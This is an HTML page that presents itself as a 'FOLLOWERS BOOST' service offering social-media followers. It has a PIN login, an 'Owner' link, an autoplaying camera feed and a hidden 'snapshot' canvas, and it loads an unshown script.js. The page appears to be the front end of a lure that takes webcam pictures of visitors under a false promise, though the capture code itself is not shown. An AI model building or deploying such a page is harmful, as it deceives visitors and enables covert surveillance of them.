<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GET FOLLOWERS</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gray-900 text-white flex flex-col items-center justify-center min-h-screen">

  <!-- Navbar -->
  <nav class="w-full bg-gray-800 p-4 flex justify-between items-center">
    <h1 class="text-xl font-bold">FOLLOWERS BOOST</h1>
    <button onclick="toggleMenu()" class="text-2xl">â˜°</button>
    <div id="navLinks" class="hidden absolute top-14 right-4 bg-gray-700 rounded shadow-lg">
      <a href="index.html" class="block px-4 py-2 hover:bg-gray-600">Home</a>
      <a href="owner.html" class="block px-4 py-2 hover:bg-gray-600">Owner</a>
    </div>
  </nav>

  <!-- User PIN -->
  <div class="mt-10 text-center">
    <h2 class="text-2xl font-semibold mb-4">Enter Access PIN</h2>
    <input id="userPin" type="password" placeholder="PIN" class="px-3 py-2 rounded text-black">
    <button onclick="userLogin()" class="bg-blue-500 px-4 py-2 ml-2 rounded hover:bg-blue-600">Login</button>
    <p id="userStatus" class="mt-4 text-green-400"></p>
  </div>

  <!-- Camera -->
  <div class="mt-6 text-center">
    <video id="camera" autoplay playsinline class="rounded-lg shadow-lg border-2 border-blue-500"></video>
    <canvas id="snapshot" class="hidden"></canvas>
  </div>

  <script src="script.js"></script>
</body>
</html>
